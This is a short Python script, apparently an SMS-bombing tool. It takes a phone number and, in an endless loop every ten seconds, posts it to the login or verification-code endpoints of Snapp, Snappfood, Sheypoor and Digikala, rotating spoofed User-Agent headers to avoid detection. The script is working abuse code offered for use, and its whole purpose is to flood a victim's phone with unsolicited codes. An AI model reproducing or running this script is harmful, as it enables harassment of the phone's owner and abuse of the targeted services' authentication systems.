import requests
import random
import time

number = input("Enter Your Phone number : ")

url_snapp = "https://errortracking.snapp.site/api/29/envelope/"

json_snapp = {"cellphone":"0" + number}

url_digikala = "https://api.digikala.com/v1/user/authenticate/"
json_digikala = {"username":"0" + number}

url_food = "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&optionalClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.1&UDID=26ab6d5c-3eb3-4b1b-80b5-b5bd2225c9a0&locale=fa"
json_food = {"cellphone":"0" + number}

url_sheypoor = "https://www.sheypoor.com/api/v10.0.0/auth/send"
json_sheypoor ={ "username":"0" + number}

heads = [
    {
        'User-Agent': 'Mozilla/5.0(windows NT 6.1 ; rv:76.0) Gecko/20100101 firefox/76.0',
        'Accept': '*/*'

    },
    {
     "User-Agent": "Mozilla/5.0(X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 firefox/72.0",
     'Accept': '*/*'
    },
    {
     "User-Agent": "Mozilla/5.0(X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 firefox/72.0",
     'Accept': '*/*'
    },
    {
     'User-Agent': 'Mozilla/5.0(windows NT 3.1 ; rv:76.0) Gecko/20100101 firefox/69.0',
     'Accept': '*/*'
    },
    {
     "User-Agent": "Mozilla/5.0(X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 firefox/76.0",
     'Accept': '*/*'
    },
    
]

while True:
    
    random_head = random.choice(heads)
    
    req1 = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print(req1)
    
    req2 = requests.post(url=url_food,json=json_food,headers=random_head)
    print(req2)
    
    req3 = requests.post(url=url_sheypoor,json=json_sheypoor,headers=random_head)
    print(req3)
    req4 = requests.post(url=url_digikala,json=json_digikala,headers=random_head)
    print(req3)
    time.sleep(10)
    